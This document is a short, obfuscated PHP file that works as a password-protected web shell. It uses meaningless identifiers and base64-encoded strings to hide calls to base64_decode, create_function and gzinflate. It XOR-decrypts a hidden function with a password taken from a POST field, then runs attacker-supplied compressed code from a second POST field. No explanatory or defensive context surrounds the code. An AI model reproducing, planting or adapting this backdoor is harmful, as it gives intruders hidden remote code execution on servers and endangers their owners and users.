<?php

class c636173bf34104
{
    private $r636173bf34343 = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r636173bf34343[$name], $args);
    }

    public function d636173bf35241($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p636173bf34336()
    {
        $qString = $this->d636173bf35241("ckpER0djK2c1QUk9OjpRVUVSWV9TVFJJTkc=");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d636173bf35241("SjhIYmVKQjA6OmU=");
        $p = $this->d636173bf35241("NFcxUzM4cTlEalNralkwTzU5UT06OnA=");

        if (!isset($_POST[$e]) ||
            !isset($_POST[$p])) {
            return;
        }

        $methodName = 'em636173bf35244';
        $methodContent = 'U0VXXR9VFwhQalVRQWlSRFZEG0s9A2gbDw==';

        $base64decode = $this->d636173bf35241("eDNNbGxFSDM3SEtIOjpiYXNlNjRfZGVjb2Rl");
        $createFunction = $this->d636173bf35241("Rlg3d1dOK3M6OmNyZWF0ZV9mdW5jdGlvbg==");
        $gzinflate = $this->d636173bf35241("c1NPdHIxVzI6Omd6aW5mbGF0ZQ==");
        $regex = $this->d636173bf35241("WC96Vy80TW5qRkU9OjovXlsgLX5dKyQv");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r636173bf34343[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c636173bf34104)->p636173bf34336();

